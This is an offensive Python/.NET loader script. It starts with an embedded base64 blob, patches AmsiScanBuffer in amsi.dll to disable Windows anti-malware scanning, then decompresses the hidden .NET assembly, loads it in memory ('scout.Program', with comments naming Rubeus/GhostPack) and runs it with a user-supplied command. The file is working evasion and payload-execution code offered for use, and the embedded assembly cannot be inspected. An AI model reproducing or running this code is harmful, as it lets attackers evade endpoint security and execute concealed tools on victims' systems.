xDPrzwEET4X3vz1+WHKFF5rQd64V2jDf8zXDeKl/czvPdZ2vPlJ9uRRrhpZpLEOdUGp/pcdrpzTEA0ZZ1fqckmeeJu5eEc2N8p8BJbg9n/8Y5kWOR6EmzTgw2mrsnNkmA73e3vlmg3ZZdSM15DmC9AU+ZttkrknVSzHGsjiDm934NYN8qmpp0zqEALkEYyywA5bMejbeCneQw+D59gevRySOwjY7Y31pY3We4DZpysuCcOi3Z349M1xYprucVW17R1tNpp/5Pfce4Ha19M5X/b6TaYmuv/SRuv9a87VZst6HMy8yAdQa4xFdGjc6leUe5J58Bvns67c93H1LTd0oaqdtjj4jjk0ioni+rRX0zLV7NzkdkkZhVRVcVrazTtNigpjh9vj/YH0wpNrQaQRG6mRZrhj5l5gu0pJiRkoP+F8mXS1OKWYrWEyIpKXpxg5oOzpVVHwojxBWWUaleLVYbLTqxSyQMbC8tXm7MVCpaMc9Bz6JKpSLGLAlVo2ZWGSDaHvVJWjVjSZPmawbWaceRY9CtGupJ1SWjWC9qdJOae5R6VnSleOXgeJevMY0XaJ1qRGN+WlTMjF4v36KGSGrFmTxD8kqLG4pmUrtRXEisizaO6rEW3VMx1wgYT8Uco56H/aNnFu6yNLGPOhzQvtEfix1LiQ=="


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("scout.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str](command)
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()